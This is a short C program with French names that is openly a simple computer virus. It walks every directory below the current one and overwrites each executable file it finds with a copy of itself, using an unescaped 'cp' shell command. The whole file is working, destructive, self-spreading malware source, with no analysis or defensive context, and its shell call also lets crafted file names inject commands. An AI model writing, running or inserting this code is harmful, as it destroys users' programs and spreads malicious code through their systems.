#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

void infection(int profondeur, char chemin[], char virus[64]){
	struct dirent **liste;
	struct stat sb;
	int nombre=scandir(chemin,&liste,0,alphasort);
	for(int j=0;j<nombre;j++){
		if(liste[j]->d_name[0]!='.'){	
			char nouveau_chemin[500];
			strcpy(nouveau_chemin,chemin);
			strcat(nouveau_chemin,"/");
			strcat(nouveau_chemin,liste[j]->d_name);
			if(liste[j]->d_type==4){
				infection(profondeur+1, nouveau_chemin, virus);
			}else if (stat(nouveau_chemin, &sb) == 0 && sb.st_mode & S_IXUSR){
				if(profondeur==0 && strcmp(virus,liste[j]->d_name) || profondeur!=0){
					char commande[569];
					snprintf(commande, 569, "cp %s %s",virus, nouveau_chemin);
					system(commande);										
				}
			}
		}
	}
}
	
int main (int argc, char *argv[]){
	char nom_virus[64];
	memcpy(nom_virus, argv[0]+2,64);
	infection(0,".",nom_virus);
	return 0;
}
